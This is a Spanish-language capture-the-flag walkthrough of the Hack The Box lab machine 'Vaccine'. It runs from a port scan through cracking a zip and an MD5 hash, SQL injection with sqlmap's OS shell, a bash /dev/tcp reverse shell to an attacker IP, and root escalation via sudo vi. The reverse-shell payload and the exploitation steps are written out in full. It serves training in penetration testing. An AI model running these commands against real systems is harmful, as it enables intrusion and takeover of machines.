https://medium.com/@mefire023/vaccine-htb-walkthrough-9139b32ee934

1. [Enumeraion](#enumeration)
```bash
    sudo nmap -sC -sV -n -Pn --disable-arp-ping <IP_ADDRESS> -D RND:5 
    # PORT   STATE SERVICE REASON         VERSION
    # 21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
    #   ftp-anon: Anonymous FTP login allowed (FTP code 230)
    #   -rwxr-xr-x    1 0        0            4096 Mar 17 2024 backup.zip
    #   ...........
    # 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```
- Se descubre que el puerto 21 tiene un servicio de FTP corriendo `vsftpd 3.0.3` y permite el acceso anónimo, lo que sugiere que podemos descargar el archivo `backup.zip` para analizarlo posteriormente.

2. [Explotación](#exploitation)

- Se decide descargar el archivo `backup.zip` utilizando `ftp` y luego extraerlo

```bash
    ftp <IP_ADDRESS>
    # Name (<IP_ADDRESS>:anonymous): anonymous
    # 230 Login successful.
    ftp> get backup.zip
    ftp> bye
    unzip backup.zip
    # Archive:  backup.zip
    # [backup.zip] backup.txt password:******
```
- Se descubre que el archivo `backup.zip` está protegido con contraseña, por lo que se decide utilizar `john the ripper` para crackear la contraseña del archivo ZIP.
- Se extrae el hash del archivo ZIP utilizando `zip2john` y luego se utiliza `john` para crackear la contraseña.

```bash
    zip2john backup.zip > hash_zip.txt
    john --show hash_zip.txt
    # Ó
    john hash_zip.txt --wordlist=/usr/share/wordlists/rockyou.txt
    # backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
    # 1 password hash cracked, 0 left
```

- Se descubre que la contraseña del archivo ZIP es `741852963`, por lo que se utiliza esta contraseña para extraer el contenido del archivo ZIP y analizarlo posteriormente.

```bash
    unzip -p 741852963 backup.zip -d backup
    cd backup
    ls -la
    # total 12
    # drwxrwxr-x 1 parrot parrot   66 abr 30 16:31 .
    # drwxr-xr-x 1 parrot parrot   56 may  5 10:01 ..
    # -rw-r--r-- 1 parrot parrot 2594 feb  3  2020 index.php
    # -rw-r--r-- 1 parrot parrot 3274 feb  3  2020 style.css
```

- Se descubre que el archivo `index.php` contiene un hash md5 de una contraseña para el usuario `admin`.

```php
    <!DOCTYPE html>
    <?php
    session_start();
    if(isset($_POST['username']) && isset($_POST['password'])) {
        if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
        $_SESSION['login'] = "true";
        header("Location: dashboard.php");
        }
    }
    ?>
    .......
```

- Se busca un decodificador de md5 en la web `https://crackstation.net/` para obtener la contraseña original `qwerty789` ó usando la herramienta `john`.

```bash
    echo "2cb42f8734ea607eefed3b70af13bbd3" > hash_md5.txt
    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_md5.txt
    # 2cb42f8734ea607eefed3b70af13bbd3:qwerty789::hash_md5.txt
    # 1 password hash cracked, 0 left
```


- Con las credenciales `admin:qwerty789`, se intenta acceder a la página de administración `dashboard.php`.
- En la página de administración, se muestra una tabla con la opción para realizar búsquedas mediante el parametro `search`, lo que sugiere que podría haber una vulnerabilidad de inyección SQL, se utiliza `sqlmap` para hacer algunas pruebas usando las cookies generadas en la autenticación.

```bash
    sqlmap -u "http://<IP_ADDRESS>/dashboard.php?search=admin" --cookie="PHPSESSID=coeqctdv36jfb17senkavgtujo"
    # [INFO] the back-end DBMS is MySQL
    # [INFO] fetching database names
    # ......
```

- Se descubre que el parámetro es vulnerable a inyección SQL, por lo que se utiliza `sqlmap` nuevamente para ver si podemos obtener una shell del sistema operativo.

```bash
    sqlmap -u "http://<IP_ADDRESS>/dashboard.php?search=admin" --cookie="PHPSESSID=coeqctdv36jfb17senkavgtujo" --os-shell
    # ......
    # [15:15:14] [INFO] fingerprinting the back-end DBMS operating system
    # [15:15:15] [INFO] the back-end DBMS operating system is Linux
    # [15:15:16] [INFO] testing if current user is DBA
    # [15:15:17] [WARNING] reflective value(s) found and filtering out
    # [15:15:17] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
    # [15:15:17] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
    # os-shell> 
```

- La shell no es interactiva, por lo que se trata de mejorarla para ello se ejecuta el siguiente payload `bash -c "bash -i >& /dev/tcp/<IP_ADDRESS>/443 0>&1"`, pero antes de eso se debe configurar un listener en `netcat` para recibir la conexión inversa.

```bash
    nc -lvnp 4444
    # Listening on [any] 4444 ...
``` 

>Nota: *bash -c “bash -i >& /dev/tcp/<IP_ADDRESS>/4444 0>&1”* es un payload que se utiliza para obtener una shell inversa en sistemas Linux. Este comando hace que el sistema víctima se conecte de vuelta a la máquina atacante en el puerto 4444, proporcionando así acceso a la shell del sistema víctima.
>
>>1. `bash -c` ejecuta el comando que sigue entre comillas.
>
>>2. `bash -i` Ejecuta Bash en **modo interactivo**. Esto asegura que el usuario remoto vea el "prompt" (como user@hostname:~$) y que se mantenga el historial de comandos y el control de trabajos.
>
>>3. `>& /dev/tcp/<IP_ADDRESS>/4444`:
>>>>- `>&` Redirige tanto la **salida estándar** (1) (lo que ves al escribir) como el **error estándar** (2) (mensajes de error) hacia esa conexión de red.
>>>>- `/dev/tcp/<IP_ADDRESS>/4444` es una característica especial de Bash que permite abrir una conexión TCP a la dirección IP y puerto especificados. 
>
>>4. `0>&1` Toma la **entrada estándar** (descriptor 0, lo que tú escribes) y la redirige a la **salida estándar** (descriptor 1), que ya fue redirigida a la conexión TCP. Esto completa el círculo para una comunicación bidireccional.

- Se ejecuta el payload en la shell obtenida con `sqlmap` y se recibe la conexión inversa en `netcat`, lo que nos da acceso a la máquina víctima.

```bash
    os-shell> bash -c "bash -i >& /dev/tcp/<IP_ADDRESS>/4444 0>&1"
    # Connection received on 10.129.95.174 44554
    # bash: cannot set terminal process group (2865): Inappropriate ioctl for device
    # bash: no job control in this shell
    # postgres@vaccine:/var/lib/postgresql/11/main$
```

- Se obtiene la shell, pero se cierra la conexión al pasar algo de tiempo, por lo que usamos `python` para mejorar la shell y hacerla interactiva.

```bash
    python3 -c "import pty; pty.spawn('/bin/bash')"
    # postgres@vaccine:/var/lib/postgresql/11/main$ 
    # CTRL-Z 

    stty raw -echo
    fg
    export TERM=xterm
```

>Nota: Explicación de los comandos para mejorar la shell (herramienta de terminal):

>>1. **`python3 -c "import pty; pty.spawn('/bin/bash')"`**: Crea un pseudo-terminal (PTY) y ejecuta Bash dentro de él. Esto convierte una shell no interactiva (obtenida vía inyección SQL) en una shell con control de trabajos, historial de comandos y soporte para editores como `vim`.
>
>>2. **`CTRL-Z`**: Suspende el proceso de Python en segundo plano (señal SIGTSTP), permitiendo ejecutar comandos en la terminal local mientras la shell remota queda pausada.
>
>>3. **`stty raw -echo`**:
>>>- `raw`: Desactiva el procesamiento de entrada por parte del terminal (no traduce Ctrl+C en SIGINT, etc.).
>>>- `-echo`: Evita que los caracteres se muestren duplicados en la pantalla local.
>>**Este paso es crítico: configura tu terminal local para que no interfiera con la comunicación bidireccional; sin él, la shell remota mostraría caracteres corruptos al enviar comandos.**
>
>>4. **`fg`**: Reanuda el proceso de Python que estaba suspendido, restaurando la conexión activa con la shell remota de la máquina víctima.
>
>>5. **`export TERM=xterm`**: Establece la variable `TERM` a `xterm`. Sin esto, comandos como `sudo`, `less`, `vim` o `less` fallarían con errores de tipo "unknown terminal type".
>
>>**Resumen del flujo**: La shell obtenida por inyección SQL es "débil" (sin PTY). Este procedimiento la convierte en una shell interactiva completa mediante:
>1. Crear un PTY con Python → 2. Suspenderlo → 3. Configurar la terminal local → 4. Restaurar el proceso → 5. Establecer variables de entorno.

- Con la shell mejorada, hacemos una búsqueda y revisión del archivo `dashboard.php` para ver su contenido y descubrir las credenciales del usuario `postgres`.

```bash
    find / -name "dashboard.php" 2>/dev/null
    # /var/www/html/dashboard.php
    cat /var/www/html/dashboard.php
    # ......
    # $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
    # ......
```

- Con dichas credenciales podemos acceder mediante `ssh` a la máquina víctima, la cual es una conexión mucho más estable.

```bash
    ssh postgres@<IP_ADDRESS>
    # P@s5w0rd!
    # Welcome to Ubuntu 18.04 (GNU/Linux 4.15.0-142-generic x86_64)
    # ......
```

- Una vez dentro ejecutamos `sudo -l` para ver los comandos que podemos ejecutar con privilegios de super usuario, y descubrimos que podemos ejecutar `vim` como `root` en el archivo `pg_hba.conf`.

```bash
    sudo -l
    # User postgres may run the following commands on vaccine:
    # (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

- Se aprovecha esta vulnerabilidad para obtener una shell de `root` ejecutando `vim` con la opción `:shell` y luego se ejecuta el siguiente payload para obtener una shell de `root`.

```bash
    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
    :!bash
    # Ó
    :set shell=/bin/bash
    :shell
    # whoami
    # root
```

> Nota: Presionando `:` en `vim` se accede al modo de comandos, donde se pueden ejecutar comandos del sistema. Al usar `:!bash`, se ejecuta una nueva instancia de Bash, lo que nos da acceso a una shell con los mismos privilegios que el proceso de `vim` (en este caso, `root`). Alternativamente, al configurar `:set shell=/bin/bash` y luego ejecutar `:shell`, también se obtiene una shell interactiva de Bash con privilegios elevados. Esta técnica es común para escalar privilegios cuando se tiene acceso a un editor como `vim` con permisos de super usuario.

3. [Post-explotación](#post-exploitation)

- Una vez obtenida la shell de `root`, se puede acceder al archivo `root.txt` para obtener la bandera.

```bash
    find /root -name "root.txt" 2>/dev/null
    # /root/root.txt
    cat /root/root.txt
    # 9c8b***************d1e
```